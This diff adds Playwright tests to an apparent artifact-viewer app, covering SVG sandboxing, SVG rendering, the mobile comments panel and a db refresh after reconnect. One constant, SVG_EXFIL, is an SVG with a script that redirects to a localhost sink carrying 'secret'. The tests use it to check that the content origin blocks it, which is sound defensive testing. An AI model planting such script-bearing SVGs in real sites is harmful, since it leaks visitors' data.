@@ -226,3 +226,100 @@ test('the viewer bar fits phone widths without horizontal scroll and leaves the 
   }
   await context.close()
 })
+
+const SVG_EXFIL = `<svg xmlns="http://www.w3.org/2000/svg"><script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script><rect width="10" height="10"/></svg>`
+
+test('an SVG opened top-level on the content origin cannot navigate out, as a version file or as an asset', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const sink = await listenSink()
+  try {
+    const { id } = store.publish({ title: 'Svg', files: { 'index.html': { content: Buffer.from('<p>x</p>') }, 'x.svg': { content: Buffer.from(SVG_EXFIL) } } })
+    const asset = store.addAsset(id, 'x.svg', Buffer.from(SVG_EXFIL), 'publisher')
+    const context = await browser.newContext()
+    for (const path of [`/a/${id}/v/1/x.svg`, `/a/${id}/assets/${asset.id}/x.svg`]) {
+      const tab = await context.newPage()
+      await tab.goto(`http://127.0.0.1:${CONTENT_PORT}${path}`)
+      await tab.waitForTimeout(1000)
+      assert.equal(tab.url(), `http://127.0.0.1:${CONTENT_PORT}${path}`)
+      assert.deepEqual(sink.hits, [], path)
+      await tab.close()
+    }
+    await context.close()
+  } finally {
+    sink.server.close()
+  }
+})
+
+test('an SVG still renders as an image and in the viewer frame', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="red"/></svg>'
+  const page = '<!doctype html><html><head></head><body><img id="pic" src="x.svg"></body></html>'
+  const { id } = store.publish({ title: 'Img', files: { 'index.html': { content: Buffer.from(page) }, 'x.svg': { content: Buffer.from(svg) } } })
+  const viewer = await browser.newPage()
+  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
+  const pic = viewer.frameLocator('#frame').locator('#pic')
+  await pic.waitFor()
+  await viewer.waitForFunction(() => (document.getElementById('frame') as HTMLIFrameElement).contentWindow !== null)
+  assert.equal(await pic.evaluate((el) => (el as HTMLImageElement).naturalWidth), 10)
+  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?path=x.svg`)
+  await viewer.waitForTimeout(500)
+  assert.ok(viewer.frames().some((frame) => frame.url().endsWith('/x.svg')))
+  await viewer.close()
+})
+
+test('the phone viewer fits the viewport and its comments panel can always be closed', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const { id } = store.publish({ title: '手機留言', files: { 'index.html': { content: Buffer.from('<!doctype html><title>x</title><p>hi</p>') } } })
+  const context = await browser.newContext()
+  const viewer = await context.newPage()
+  for (const [width, height] of [[375, 700], [320, 640]]) {
+    await viewer.setViewportSize({ width, height })
+    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
+    await viewer.locator('#title').waitFor({ state: 'attached' })
+    const size = () => viewer.evaluate(() => ({ sh: document.documentElement.scrollHeight, ih: innerHeight, sw: document.documentElement.scrollWidth, iw: innerWidth }))
+    const fits = async (when: string) => {
+      const m = await size()
+      assert.ok(m.sh <= m.ih, `${width}px ${when}: page ${m.sh} taller than viewport ${m.ih}`)
+      assert.ok(m.sw <= m.iw, `${width}px ${when}: page ${m.sw} wider than viewport ${m.iw}`)
+    }
+    await fits('closed')
+    const panel = viewer.locator('#comments')
+    await viewer.locator('#toggle-comments').click()
+    await panel.waitFor({ state: 'visible' })
+    await fits('open')
+    await viewer.locator('#toggle-comments').click({ timeout: 3000 })
+    await panel.waitFor({ state: 'hidden' })
+    await viewer.locator('#toggle-comments').click()
+    await panel.waitFor({ state: 'visible' })
+    await viewer.locator('#close-comments').click({ timeout: 3000 })
+    await panel.waitFor({ state: 'hidden' })
+    assert.equal(await viewer.locator('#toggle-comments').getAttribute('aria-expanded'), 'false')
+  }
+  await context.close()
+})
+
+test('a viewer on an older version still re-reads db after a reconnect when a newer version appeared meanwhile', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const page = `<!doctype html><html><head></head><body><p id="value">?</p>
+<script>
+async function refresh() { const doc = await artifact.db.get('c', 'main'); document.getElementById('value').textContent = String(doc?.data?.n ?? 0) }
+artifact.db.subscribe(refresh)
+refresh()
+</script></body></html>`
+  const files = { 'index.html': { content: Buffer.from(page) } }
+  const { id } = store.publish({ title: 'Old', capabilities: ['db'], files })
+  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--2-->') } } })
+  const context = await browser.newContext()
+  const viewer = await context.newPage()
+  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}?v=1`)
+  const frame = viewer.frameLocator('#frame')
+  await frame.locator('#value').filter({ hasText: '0' }).waitFor()
+
+  await context.setOffline(true)
+  const appServer = servers[0]
+  if ('closeAllConnections' in appServer) appServer.closeAllConnections()
+  store.setDoc(id, 'c', 'main', { n: 9 }, false)
+  store.update(id, { files: { 'index.html': { content: Buffer.from(page + '<!--3-->') } } })
+  await viewer.waitForTimeout(1000)
+  await context.setOffline(false)
+
+  await frame.locator('#value').filter({ hasText: '9' }).waitFor({ timeout: 8000 })
+  assert.match(viewer.url(), /v=1/)
+  await context.close()
+})
